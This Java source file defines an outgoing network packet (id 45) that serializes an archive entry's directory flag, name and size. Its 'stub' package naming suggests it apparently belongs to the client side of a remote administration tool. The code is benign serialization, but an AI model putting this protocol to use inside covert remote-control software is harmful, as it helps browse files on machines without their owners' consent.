package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet45ArchivePreview extends AbstractOutgoingPacket {

	private boolean directory;
	private String name;
	private long size;

	public Packet45ArchivePreview(boolean directory, String name, long size) {
		this.directory = directory;
		this.name = name;
		this.size = size;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeBoolean(directory);
		sw.writeLine(name);
		dos.writeLong(size);
	}

	@Override
	public byte getPacketId() {
		return 45;
	}

}
